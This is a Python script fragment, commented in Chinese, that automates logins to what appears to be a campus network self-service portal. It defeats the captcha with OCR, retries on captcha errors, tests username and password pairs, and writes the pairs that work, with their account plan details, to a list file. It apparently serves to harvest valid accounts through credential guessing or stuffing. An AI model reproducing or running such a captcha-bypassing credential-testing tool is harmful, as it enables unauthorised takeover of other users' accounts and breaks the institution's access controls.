#cookie保持
#第一步：请求首页面，获取cookie
session = requests.Session()


def getChatcha(chatcha_url): 
    #获取验证码
    cap_response = session.get(chatcha_url)
    f = open("theNewcode.jpg",'wb')
    f.write(cap_response.content)
    f.close
    time.sleep(1)

def getcodestring(Chaturl):
    getChatcha(Chaturl)
    text = pytesseract.image_to_string(Image.open("theNewcode.jpg"))
    return text

i = 0
j = 0
def login(login_user,login_pwd):
    user_agent = r'Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.1453.94 Safari/537.36'
    #Headers信息
    header = {'User-Agnet': user_agent, 'Connection': 'keep-alive'}
    login_url = "http://10.255.252.1:8080/z-os/self/login"
    url = "http://10.255.252.1:8080/z-os/checkcode/captcha-image"
    login_data = {
        'userName':login_user,
        'passWord':login_pwd,
        'validCode':getcodestring(url)
    }
    global i
    global j

    login_response = session.post(login_url, data = login_data, headers=header)

    #{"resultCode":206,"resultMsg":"密码不正确!"}
    #{"resultCode":202,"resultMsg":"验证码输入错误!"}
    #{"resultCode":205,"resultMsg":"用户名不存在!"}
    if login_response.json()["resultCode"] == 202:
        #验证码错误  重新登录
        print("再次登陆中.....")
        login(login_user,login_pwd)
    elif login_response.json()["resultCode"] == 200:
        #登录成功，获取套餐信息
        login_index = session.get("http://10.255.252.1:8080/z-os/self/main", headers=header)
        soup = BeautifulSoup(login_index.text,'html.parser')
        res = soup.select(".user_info_border p")[0].string
        res_days = soup.select(".mod_box .user_info ul li")[2]("p")[0].string
        print(res,res_days)
        if res !="初始化套餐":
            i +=1
            print("第{}次登陆成功！".format(i))
            with open('yixueyuanList.txt','a',encoding='utf-8') as f:
                f.write(str(i) +"\t"+ str(login_data['userName']) +"\t"+ str(login_data['passWord'])+"\t"+ str(res) +"\t" + str(res_days) +"\n")
    #206 密码不正确    205用户名不存在
    else:
        j += 1
        print("错误状态是：{}，状态码是：{}".format(login_response.json()["resultMsg"],login_response.json()["resultCode"]))
        with open('yixueyuanError.txt', 'a', encoding='utf-8') as f:
            f.write(str(j) +"\t"+ str(login_data['userName']) + str(login_data['passWord']) +  "\t" + str(login_response.json()["resultMsg"])+"\n")


